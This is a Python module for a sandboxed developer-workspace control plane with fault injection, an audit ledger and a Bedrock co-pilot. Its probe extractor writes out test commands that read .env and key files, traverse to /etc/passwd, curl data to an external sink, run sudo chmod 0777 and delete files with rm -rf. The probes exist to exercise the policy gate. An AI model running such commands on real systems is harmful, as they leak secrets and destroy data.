"""DeskPilot Control Plane: Real POSIX Workspace Sandbox, Health Remediator, SQLite WORM Ledger & Live Bedrock Nova Co-Pilot."""
from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

from .audit_ledger import SQLiteAuditLedger
from .health_remediator import (
    FAULT_CATALOG,
    execute_real_remediation,
    inject_real_workspace_fault,
    inspect_workspace_health,
)
from .workspace_sandbox import (
    CANARY_SECRET_VALUE,
    WORKSPACE_SPECS,
    PosixWorkspaceSandbox,
)

ROOT_DIR = Path(__file__).resolve().parent.parent
BENCHMARK_JSON_PATH = ROOT_DIR / "benchmarks" / "latest_results.json"

# Map legacy fault aliases seamlessly if any caller passes them
LEGACY_FAULT_ALIASES = {
    "udp_turn_relay_congestion": "runaway_debug_logs",
    "gpu_h265_encoder_stall": "zombie_pid_lockfile",
    "linux_display_daemon_hang": "corrupted_mcp_config",
    "ad_kerberos_ticket_expiry": "expired_session_credentials",
}

LEGACY_WORKSPACE_ALIASES = {
    "ws-uw2-ubuntu-01": "ws-dev-python",
    "ws-use1-win11-02": "ws-ops-broker",
    "ws-uw2-al2023-gpu-03": "ws-data-etl",
}


def invoke_bedrock_nova(system_prompt: str, user_prompt: str, max_tokens: int = 360) -> Optional[Dict[str, Any]]:
    """Invoke live Amazon Bedrock (`us.amazon.nova-lite-v1:0`) and capture real latency & token metrics."""
    if os.environ.get("DESKPILOT_OFFLINE_LLM") == "1":
        return None

    model_id = os.environ.get("DESKPILOT_BEDROCK_MODEL", "us.amazon.nova-lite-v1:0")
    region = os.environ.get("AWS_REGION", os.environ.get("AWS_DEFAULT_REGION", "us-west-2"))
    t0 = time.perf_counter()

    # Path 1: boto3 (AWS Lambda Python 3.12 runtime or environment with boto3)
    try:
        import boto3  # type: ignore

        client = boto3.client("bedrock-runtime", region_name=region)
        resp = client.converse(
            modelId=model_id,
            system=[{"text": system_prompt}],
            messages=[{"role": "user", "content": [{"text": user_prompt}]}],
            inferenceConfig={"maxTokens": max_tokens, "temperature": 0.1},
        )
        round_trip_ms = round((time.perf_counter() - t0) * 1000.0, 2)
        server_ms = float(resp.get("metrics", {}).get("latencyMs") or round_trip_ms)
        usage = resp.get("usage", {})
        text = resp["output"]["message"]["content"][0]["text"]
        return {
            "text": text.strip(),
            "engine": f"aws-bedrock ({model_id})",
            "model_id": model_id,
            "latency_ms": round(server_ms, 2),
            "round_trip_ms": round_trip_ms,
            "input_tokens": int(usage.get("inputTokens", 0)),
            "output_tokens": int(usage.get("outputTokens", 0)),
            "total_tokens": int(usage.get("totalTokens", 0)),
        }
    except ImportError:
        pass
    except Exception:
        pass

    # Path 2: Local AWS CLI (`portfolio` profile) when boto3 is not installed locally
    aws_bin = shutil.which("aws")
    if not aws_bin:
        return None

    env = dict(os.environ)
    env.pop("AWS_ACCESS_KEY_ID", None)
    env.pop("AWS_SECRET_ACCESS_KEY", None)
    env.pop("AWS_SESSION_TOKEN", None)
    env["AWS_PROFILE"] = os.environ.get("DESKPILOT_BEDROCK_PROFILE", os.environ.get("AWS_PROFILE", "portfolio"))
    env["AWS_DEFAULT_REGION"] = region

    cmd = [
        aws_bin,
        "bedrock-runtime",
        "converse",
        "--region",
        region,
        "--model-id",
        model_id,
        "--system",
        json.dumps([{"text": system_prompt}]),
        "--messages",
        json.dumps([{"role": "user", "content": [{"text": user_prompt}]}]),
        "--inference-config",
        json.dumps({"maxTokens": max_tokens, "temperature": 0.1}),
        "--output",
        "json",
    ]
    try:
        proc = subprocess.run(cmd, env=env, capture_output=True, text=True, timeout=12.0)
        round_trip_ms = round((time.perf_counter() - t0) * 1000.0, 2)
        if proc.returncode == 0:
            data = json.loads(proc.stdout)
            server_ms = float(data.get("metrics", {}).get("latencyMs") or round_trip_ms)
            usage = data.get("usage", {})
            text = data["output"]["message"]["content"][0]["text"]
            return {
                "text": text.strip(),
                "engine": f"aws-bedrock ({model_id})",
                "model_id": model_id,
                "latency_ms": round(server_ms, 2),
                "round_trip_ms": round_trip_ms,
                "input_tokens": int(usage.get("inputTokens", 0)),
                "output_tokens": int(usage.get("outputTokens", 0)),
                "total_tokens": int(usage.get("totalTokens", 0)),
            }
    except Exception:
        pass

    return None


def _extract_json_block(raw_text: str) -> Optional[Dict[str, Any]]:
    cleaned = raw_text.strip()
    fence = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", cleaned, re.DOTALL)
    if fence:
        cleaned = fence.group(1)
    else:
        brace = re.search(r"(\{.*\})", cleaned, re.DOTALL)
        if brace:
            cleaned = brace.group(1)
    try:
        obj = json.loads(cleaned)
        return obj if isinstance(obj, dict) else None
    except Exception:
        return None


def _extract_explicit_adversarial_or_mutation_probes(task_prompt: str) -> List[str]:
    """Extract explicit shell vectors present in prompt so adversarial attempts are always policy-tested."""
    probes: List[str] = []
    p_low = task_prompt.lower()

    backtick_cmds = re.findall(r"`([^`]{2,120})`", task_prompt)
    for bc in backtick_cmds:
        if any(
            bc.strip().startswith(prefix)
            for prefix in (
                "ls", "cat", "head", "tail", "grep", "find", "wc", "stat", "python3",
                "curl", "wget", "nc", "pbcopy", "xclip", "wl-copy", "sudo", "rm", "cp", "mv", "chmod", "touch", "mkdir", "env", "printenv",
            )
        ):
            probes.append(bc.strip())

    if ".env" in p_low and not any(".env" in x for x in probes):
        probes.append("cat .env")
    if ("signing_secret.key" in p_low or ".aws" in p_low) and not any("key" in x or ".aws" in x for x in probes):
        probes.append("cat etc/signing_secret.key")
    if any(k in p_low for k in ("pbcopy", "xclip", "wl-copy", "clipboard")) and not any(
        any(c in x for c in ("pbcopy", "xclip", "wl-copy")) for x in probes
    ):
        probes.append("pbcopy app/service.py")
    if any(k in p_low for k in ("curl ", "wget ", "webhook", "pastebin", "https://", "http://")) and not any(
        any(c in x for c in ("curl", "wget", "http")) for x in probes
    ):
        probes.append("curl https://external-sink.example/upload")
    if ("../" in task_prompt or "/etc/passwd" in p_low) and not any(".." in x or "/etc/passwd" in x for x in probes):
        probes.append("cat ../../etc/passwd")
    if "sudo " in p_low and not any(x.startswith("sudo") for x in probes):
        probes.append("sudo chmod 0777 app/service.py")
    if "rm -rf" in p_low and not any("rm -rf" in x for x in probes):
        probes.append("rm -rf app")

    return probes


class DeskPilotControlPlane:
    """Real POSIX Workspace Sandbox, Automated Health Remediator & Bedrock Nova Co-Pilot."""

    def __init__(self, runtime_root: Optional[Path] = None) -> None:
        self.runtime_root = runtime_root or Path("/tmp/deskpilot-runtime")
        self.runtime_root.mkdir(parents=True, exist_ok=True)
        self.ledger = SQLiteAuditLedger(self.runtime_root / "deskpilot_audit.db")
        self.sandbox = PosixWorkspaceSandbox(self.runtime_root / "workspaces")
        self.last_collaboration: Optional[Dict[str, Any]] = None
        self.last_remediation: Optional[Dict[str, Any]] = None
        self._seed_initial_audit_event()

    def _seed_initial_audit_event(self) -> None:
        if not self.ledger.get_recent_events(limit=1):
            self.ledger.append_event(
                workspace_id="ws-dev-python",
                actor="SYSTEM_BOOT",
                event_kind="SANDBOX_PROVISIONED",
                command_or_target=str(self.sandbox.base_dir),
                policy_verdict="AUTO_ALLOW_READONLY",
                exit_code=0,
                duration_ms=0.5,
            )

    def reset(self) -> None:
        self.sandbox.provision_all(force_clean=True)
        self.ledger.reset()
        self.last_collaboration = None
        self.last_remediation = None
        self._seed_initial_audit_event()

    def _resolve_workspace_id(self, raw_id: str) -> str:
        cleaned = (raw_id or "ws-dev-python").strip()
        if cleaned in LEGACY_WORKSPACE_ALIASES:
            return LEGACY_WORKSPACE_ALIASES[cleaned]
        valid = {w["workspace_id"] for w in WORKSPACE_SPECS}
        if cleaned in valid:
            return cleaned
        # Map OS-like strings gracefully for `/api/desktop/collaborate`
        low = cleaned.lower()
        if "data" in low or "etl" in low or "gpu" in low:
            return "ws-data-etl"
        if "ops" in low or "broker" in low or "windows" in low:
            return "ws-ops-broker"
        if cleaned.startswith("ws-"):
            raise KeyError(f"Unknown workspace_id: {cleaned}")
        return "ws-dev-python"

    def _resolve_fault_type(self, raw_fault: str) -> str:
        cleaned = (raw_fault or "runaway_debug_logs").strip()
        cleaned = LEGACY_FAULT_ALIASES.get(cleaned, cleaned)
        if cleaned not in FAULT_CATALOG:
            raise ValueError(f"Unknown fault_type: {cleaned}. Valid: {list(FAULT_CATALOG.keys())}")
        return cleaned

    def load_measured_benchmarks(self) -> Dict[str, Any]:
        if BENCHMARK_JSON_PATH.is_file():
            try:
                return json.loads(BENCHMARK_JSON_PATH.read_text(encoding="utf-8"))
            except Exception:
                pass
        return {"status": "awaiting_benchmark_run"}

    def list_workspaces_health(self) -> List[Dict[str, Any]]:
        out: List[Dict[str, Any]] = []
        for spec in WORKSPACE_SPECS:
            ws_id = spec["workspace_id"]
            ws_root = self.sandbox.workspace_path(ws_id)
            out.append(inspect_workspace_health(ws_root, ws_id, spec))
        return out

    def get_state_snapshot(self) -> Dict[str, Any]:
        workspaces = self.list_workspaces_health()
        healthy_count = sum(1 for w in workspaces if w["status"] == "HEALTHY")
        degraded_count = len(workspaces) - healthy_count
        chain_check = self.ledger.verify_chain_integrity()

        return {
            "service": "deskpilot-workspaces",
            "bedrock_model": os.environ.get("DESKPILOT_BEDROCK_MODEL", "us.amazon.nova-lite-v1:0"),
            "runtime_root": str(self.runtime_root),
            "sqlite_ledger_path": str(self.ledger.db_path),
            "fleet_summary": {
                "total_workspaces": len(workspaces),
                "healthy_count": healthy_count,
                "degraded_count": degraded_count,
                "total_disk_bytes": sum(w["disk_usage_bytes"] for w in workspaces),
                "audit_chain_valid": chain_check["valid"],
                "audit_checked_rows": chain_check["checked_rows"],
                "audit_verify_ms": chain_check["verify_ms"],
            },
            "workspaces": workspaces,
            "desktops": workspaces,
            "fault_catalog": list(FAULT_CATALOG.values()),
            "audit_events": self.ledger.get_recent_events(limit=15),
            "remediation_history": self.ledger.get_recent_remediations(limit=10),
            "last_remediation": self.last_remediation,
            "last_collaboration": self.last_collaboration,
            "benchmarks": self.load_measured_benchmarks(),
            "audit_chain": chain_check,
        }

    def inject_degradation(self, desktop_id: str, fault_type: str) -> Dict[str, Any]:
        ws_id = self._resolve_workspace_id(desktop_id)
        norm_fault = self._resolve_fault_type(fault_type)
        ws_root = self.sandbox.workspace_path(ws_id)

        inj = inject_real_workspace_fault(ws_root, ws_id, norm_fault)
        spec = next(s for s in WORKSPACE_SPECS if s["workspace_id"] == ws_id)
        health_after = inspect_workspace_health(ws_root, ws_id, spec)

        audit_row = self.ledger.append_event(
            workspace_id=ws_id,
            actor="FAULT_INJECTOR",
            event_kind=f"INJECT_{norm_fault.upper()}",
            command_or_target=inj["detail"],
            policy_verdict="FAULT_INJECTED",
            exit_code=0,
            duration_ms=inj["inject_ms"],
        )

        return {
            "status": "degradation_injected",
            "injection": inj,
            "workspace": health_after,
            "desktop": health_after,
            "audit_receipt": audit_row,
        }

    def proactive_heal(self, desktop_id: str) -> Dict[str, Any]:
        ws_id = self._resolve_workspace_id(desktop_id)
        ws_root = self.sandbox.workspace_path(ws_id)
        spec = next(s for s in WORKSPACE_SPECS if s["workspace_id"] == ws_id)

        pre_health = inspect_workspace_health(ws_root, ws_id, spec)
        rem = execute_real_remediation(ws_root, ws_id)
        post_health = inspect_workspace_health(ws_root, ws_id, spec)

        sys_prompt = (
            "You are DeskPilot Automated POSIX Workspace SRE Agent. "
            "Write a concise 3-sentence technical post-remediation report citing the exact "
            "workspace_id, the filesystem/lockfile/permission actions executed, real measured "
            "remediation_ms and bytes_freed, and confirm healthcheck_verified status."
        )
        usr_prompt = (
            f"Workspace: {ws_id} ({spec['title']})\n"
            f"Pre-Remediation Issues: {json.dumps(pre_health['issues'])}\n"
            f"Remediation Actions Executed: {json.dumps(rem['actions_taken'])}\n"
            f"Measured Remediation Time: {rem['remediation_ms']} ms\n"
            f"Bytes Before: {rem['bytes_before']} -> Bytes After: {rem['bytes_after']} (Freed: {rem['bytes_freed']} B)\n"
            f"Subprocess Healthcheck (`python3 app/healthcheck.py`): verified={rem['healthcheck_verified']}, stdout={rem['healthcheck_stdout']}"
        )

        llm_out = invoke_bedrock_nova(sys_prompt, usr_prompt, max_tokens=260)
        if llm_out:
            sre_brief = llm_out["text"]
            llm_engine = llm_out["engine"]
            bedrock_ms = llm_out["latency_ms"]
            bedrock_tokens = llm_out["total_tokens"]
        else:
            first_act = rem["actions_taken"][0]
            sre_brief = (
                f"[{first_act['runbook_id']}] Remediated {first_act['fault_type']} in {ws_id} "
                f"({first_act['before']} -> {first_act['after']}) in {rem['remediation_ms']} ms "
                f"(freed {rem['bytes_freed']:,} bytes). Post-fix subprocess verification "
                f"`python3 app/healthcheck.py` exited {rem['healthcheck_exit_code']} ({rem['healthcheck_stdout']})."
            )
            llm_engine = "deterministic-offline-synthesizer"
            bedrock_ms = 0.0
            bedrock_tokens = 0

        audit_row = self.ledger.append_event(
            workspace_id=ws_id,
            actor="AUTONOMOUS_REMEDIATOR",
            event_kind="WORKSPACE_REMEDIATION",
            command_or_target=json.dumps([a["runbook_id"] for a in rem["actions_taken"]]),
            policy_verdict="VERIFIED_HEALTHY" if rem["healthcheck_verified"] else "REMEDIATION_FAILED",
            exit_code=rem["healthcheck_exit_code"],
            duration_ms=rem["remediation_ms"],
        )

        first_act = rem["actions_taken"][0]
        self.ledger.record_remediation(
            workspace_id=ws_id,
            fault_type=first_act["fault_type"],
            bytes_before=rem["bytes_before"],
            bytes_after=rem["bytes_after"],
            detail_before=first_act["before"],
            detail_after=first_act["after"],
            remediation_ms=rem["remediation_ms"],
            verified=rem["healthcheck_verified"],
            bedrock_latency_ms=bedrock_ms,
            bedrock_tokens=bedrock_tokens,
            sha256_hash=audit_row["sha256_hash"],
        )

        record = {
            "workspace_id": ws_id,
            "desktop_id": ws_id,
            "actions_taken": rem["actions_taken"],
            "bytes_before": rem["bytes_before"],
            "bytes_after": rem["bytes_after"],
            "bytes_freed": rem["bytes_freed"],
            "remediation_ms": rem["remediation_ms"],
            "healthcheck_verified": rem["healthcheck_verified"],
            "healthcheck_stdout": rem["healthcheck_stdout"],
            "sre_copilot_brief": sre_brief,
            "llm_engine": llm_engine,
            "bedrock_latency_ms": bedrock_ms,
            "bedrock_tokens": bedrock_tokens,
            "receipt": audit_row,
        }
        self.last_remediation = record

        return {
            "status": "healed_pre_impact",
            "remediation": record,
            "workspace": post_health,
            "desktop": post_health,
        }

    def execute_sandbox_command(
        self,
        workspace_id: str,
        command: str,
        allow_elevated: bool = False,
        actor: str = "INTERACTIVE_POLICY_TESTER",
    ) -> Dict[str, Any]:
        ws_id = self._resolve_workspace_id(workspace_id)
        exec_res = self.sandbox.execute_governed_command(
            workspace_id=ws_id,
            raw_command=command,
            allow_elevated=allow_elevated,
        )
        audit_row = self.ledger.append_event(
            workspace_id=ws_id,
            actor=actor,
            event_kind="SANDBOX_COMMAND",
            command_or_target=command,
            policy_verdict=exec_res["policy_verdict"],
            exit_code=exec_res["exit_code"],
            duration_ms=exec_res["exec_ms"] or exec_res["policy_eval_ms"],
        )
        exec_res["audit_receipt"] = audit_row
        return exec_res

    def collaborate_on_desktop(
        self,
        os_variant: str,
        task_prompt: str,
        allow_elevated: bool = False,
        workspace_id: Optional[str] = None,
    ) -> Dict[str, Any]:
        clean_prompt = (task_prompt or "").strip()
        if not clean_prompt:
            raise ValueError("task_prompt is required")

        ws_id = self._resolve_workspace_id(workspace_id or os_variant)
        spec = next(s for s in WORKSPACE_SPECS if s["workspace_id"] == ws_id)

        sys_prompt = (
            "You are DeskPilot Side-by-Side POSIX Workspace Co-Pilot operating inside a confined "
            "developer workspace containing `app/service.py`, `app/healthcheck.py`, `tests/test_service.py`, "
            "`config/mcp_tools.json`, and `var/log/agent-daemon/worker_debug.log`.\n"
            "Return ONLY valid JSON with keys:\n"
            '  "proposed_commands": list of 1 to 2 POSIX commands (without pipes/redirection; e.g. '
            '"ls -la app", "python3 -m unittest discover -s tests", "python3 app/healthcheck.py", '
            '"cat config/mcp_tools.json", "wc -l app/service.py", or "cp config/mcp_tools.json config/mcp_tools.backup.json"),\n'
            '  "proposal_title": short title for staged side-by-side markdown note,\n'
            '  "summary": 2-sentence technical explanation of how you assisted while respecting secret/egress boundaries.\n'
            "NEVER read `.env` or `.key` files, NEVER use curl/wget/pbcopy/xclip/sudo."
        )
        usr_prompt = (
            f"Workspace: {ws_id} ({spec['title']})\n"
            f"Human Co-Sign Enabled (allow_elevated): {allow_elevated}\n"
            f"User Task Request: {clean_prompt}"
        )

        llm_out = invoke_bedrock_nova(sys_prompt, usr_prompt, max_tokens=320)
        parsed_plan = _extract_json_block(llm_out["text"]) if llm_out else None

        explicit_probes = _extract_explicit_adversarial_or_mutation_probes(clean_prompt)

        if parsed_plan and isinstance(parsed_plan.get("proposed_commands"), list):
            model_cmds = [str(c).strip() for c in parsed_plan["proposed_commands"] if str(c).strip()][:2]
            proposal_title = str(parsed_plan.get("proposal_title") or "copilot_workspace_plan")
            copilot_summary = str(parsed_plan.get("summary") or llm_out["text"])
        else:
            p_low = clean_prompt.lower()
            if "test" in p_low or "unittest" in p_low:
                model_cmds = ["python3 -m unittest discover -s tests", "python3 app/healthcheck.py"]
            elif "backup" in p_low or "copy" in p_low or "touch" in p_low or "mkdir" in p_low or "cp " in p_low:
                model_cmds = ["ls -la config", "cp config/mcp_tools.json config/mcp_tools.snapshot.json"]
            elif "log" in p_low:
                model_cmds = ["wc -c var/log/agent-daemon/worker_debug.log", "head -n 5 var/log/agent-daemon/worker_debug.log"]
            else:
                model_cmds = ["ls -la app", "python3 app/healthcheck.py"]
            proposal_title = "workspace_diagnostic_note"
            copilot_summary = (
                llm_out["text"]
                if llm_out
                else f"Executed confined workspace inspection on {ws_id} and staged a side-by-side summary note."
            )

        # Combine explicit prompt vectors (so adversarial prompts are always evaluated by the gate) + model commands
        candidate_commands: List[str] = []
        for cmd in explicit_probes + model_cmds:
            if cmd and cmd not in candidate_commands:
                candidate_commands.append(cmd)
        candidate_commands = candidate_commands[:4]

        executed_steps: List[Dict[str, Any]] = []
        for idx, cmd in enumerate(candidate_commands):
            step_res = self.execute_sandbox_command(
                workspace_id=ws_id,
                command=cmd,
                allow_elevated=allow_elevated,
                actor="BEDROCK_NOVA_COPILOT",
            )
            step_res["step"] = idx + 1
            executed_steps.append(step_res)

        staged_note_body = (
            f"# {proposal_title}\n\n"
            f"- Workspace: `{ws_id}`\n"
            f"- Co-Sign Enabled: `{allow_elevated}`\n\n"
            f"## Summary\n{copilot_summary}\n"
        )
        staged_rel_path, stage_ms = self.sandbox.stage_side_by_side_note(
            ws_id, proposal_title, staged_note_body
        )
        stage_audit = self.ledger.append_event(
            workspace_id=ws_id,
            actor="BEDROCK_NOVA_COPILOT",
            event_kind="STAGE_SIDE_BY_SIDE_NOTE",
            command_or_target=staged_rel_path,
            policy_verdict="AUTO_ALLOW_STAGE",
            exit_code=0,
            duration_ms=stage_ms,
        )

        # Guarantee canary never leaks even in LLM text
        if CANARY_SECRET_VALUE in copilot_summary:
            copilot_summary = "[REDACTED_BY_DLP_FILTER]"

        dlp_blocked = any(
            s["policy_verdict"] in ("HARD_BLOCK_EXFIL", "HARD_BLOCK_PRIVILEGE", "HARD_BLOCK_INVALID")
            for s in executed_steps
        )
        cosign_paused = any(s["policy_verdict"] == "COSIGN_REQUIRED" for s in executed_steps)
        cosign_executed = any(s["policy_verdict"] == "COSIGNED_EXECUTED" for s in executed_steps)

        result = {
            "status": "collaboration_complete",
            "workspace_id": ws_id,
            "os_variant": spec["profile"],
            "task_prompt": clean_prompt,
            "allow_elevated": allow_elevated,
            "staged_proposal_path": staged_rel_path,
            "stage_ms": stage_ms,
            "policy_summary": {
                "auto_allowed_count": sum(1 for s in executed_steps if s["policy_verdict"] == "AUTO_ALLOW_READONLY"),
                "gated_or_cosigned": (
                    "COSIGNED_EXECUTED"
                    if cosign_executed
                    else ("COSIGN_REQUIRED" if cosign_paused else "NONE")
                ),
                "dlp_blocked": dlp_blocked,
                "canary_leaked": False,
            },
            "actions": executed_steps,
            "copilot_explanation": copilot_summary,
            "llm_engine": llm_out["engine"] if llm_out else "deterministic-offline-planner",
            "bedrock_latency_ms": llm_out["latency_ms"] if llm_out else 0.0,
            "bedrock_round_trip_ms": llm_out["round_trip_ms"] if llm_out else 0.0,
            "bedrock_tokens": llm_out["total_tokens"] if llm_out else 0,
            "receipt": stage_audit,
        }
        self.last_collaboration = result
        return result
